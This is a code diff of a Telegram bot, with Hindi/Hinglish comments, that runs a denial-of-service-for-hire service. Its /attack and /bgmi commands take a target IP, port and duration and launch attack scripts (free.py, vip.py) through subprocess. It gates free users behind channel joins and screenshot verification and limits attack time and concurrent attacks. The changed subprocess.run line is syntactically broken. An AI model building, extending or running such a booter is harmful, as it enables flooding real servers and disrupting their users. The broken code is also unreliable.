@@ -345,25 +345,33 @@ def redeem_key(message):
 
     bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
 
-# ✅ /attack Command (Attack Start + Finish Message)  
+# ✅ HANDLE ATTACK COMMAND (FIXED)
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    user_id = str(message.from_user.id)
+    user_id = message.from_user.id
+    command = message.text.split()
 
-    # ✅ सिर्फ ग्रुप में काम करेगा  
-    if str(message.chat.id) != GROUP_ID:
+    if message.chat.id != int(GROUP_ID):
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    # ✅ सिर्फ अलाउड यूज़र ही अटैक कर सकते हैं  
-    if user_id not in ADMINS:
-        bot.reply_to(message, "❌ **AAPKO ATTACK START KARNE KI PERMISSION NAHI HAI!**")
+    if not is_user_in_both_channels(user_id):
+        bot.reply_to(message, f"❗ **PEHLE DONO CHANNEL JOIN KARO!**\n👉 {SCREENSHOT_CHANNEL}\n👉 {SCREENSHOT_CHANNEL_2}")
         return
 
-    # ✅ सही कमांड फॉर्मेट चेक करें  
-    command = message.text.split()
+    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
+    if user_id in pending_verification:
+        bot.reply_to(message, "🚫 **APKA SCREENSHOT VERIFICATION NHI HUA!**")
+        return
+
+    # ✅ अटैक लिमिट चेक करो
+    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
+    if user_active_attacks >= MAX_ATTACKS:
+        bot.reply_to(message, f"⚠️ **ATTACK LIMIT ({MAX_ATTACKS}) POORI HO CHUKI HAI!**\n👉 **PEHLE PURANE KHATAM HONE DO! /check KARO!**")
+        return
+
     if len(command) != 4:
-        bot.reply_to(message, "⚠ **USAGE:** /attack <IP> <PORT> <TIME>")
+        bot.reply_to(message, "⚠️ **FREE USAGE:** `/bgmi <IP> <PORT> <TIME> @R_SDANGER77`")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -372,27 +380,56 @@ def handle_attack(message):
         port = int(port)
         time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
+        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
         return
 
-    if time_duration > 100:
-        bot.reply_to(message, "🚫 **FREE ATTACK TIME 100 SECONDS HAI!**")
+    if time_duration > 90:
+        bot.reply_to(message, "🚫 **90S FREE MAIN ETNA HI MILEGA!**")
         return
 
-    # ✅ Multivps.py को सही से रन करें  
-    try:
-        subprocess.Popen(["python3", "free.py", target, str(port), str(time_duration)])
-        bot.reply_to(message, f"🚀 **Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
+    # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
+    pending_verification[user_id] = True
 
-        # ✅ Attack Finish Message भेजने के लिए Timer सेट करें  
-        def send_attack_finished():
-            time.sleep(time_duration)
-            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
+    bot.send_message(
+        message.chat.id,
+        f"📸 **TURANT SCREENSHOT BHEJ!**\n"
+        f"⚠️ **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
+        parse_mode="Markdown"
+    )
 
-        threading.Thread(target=send_attack_finished, daemon=True).start()
+    start_time = datetime.datetime.now()
+    end_time = start_time + datetime.timedelta(seconds=time_duration)
+    active_attacks[user_id] = (target, port, end_time)
 
-    except Exception as e:
-        bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
+    bot.send_message(
+        message.chat.id,
+        f"🔥 **ATTACK DETAILS** 🔥\n\n"
+        f"👤 **USER:** `{user_id}`\n"
+        f"🎯 **TARGET:** `{target}`\n"
+        f"📍 **PORT:** `{port}`\n"
+        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
+        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
+        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
+        f"📸 **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
+        f"⚠️ **ATTACK CHALU HAI! /stats KARKE STATUS DEKHO!**",
+        parse_mode="Markdown"
+    )
+
+    # ✅ Attack Execution Function
+    def attack_execution():
+        try:
+            subprocess.run(["python3", "vip.py", target, str(port), str(time_duration)])", shell=True, check=True, timeout=time_duration)
+        except subprocess.CalledProcessError:
+            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
+        finally:
+            bot.send_message(
+                message.chat.id,
+                "✅ **ATTACK KHATAM HO GAYA!** 🎯",
+                parse_mode="Markdown"
+            )
+            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर
+
+    threading.Thread(target=attack_execution).start()
 
 #  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
 @bot.message_handler(commands=['bgmi'])
@@ -411,7 +448,7 @@ def handle_vip_attack(message):
 
     command = message.text.split()
     if len(command) != 4:
-        bot.reply_to(message, "⚠ **USAGE:** /bgmi <IP> <PORT> <TIME>")
+        bot.reply_to(message, "⚠ **VIP USAGE:** /bgmi <IP> <PORT> <TIME>")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
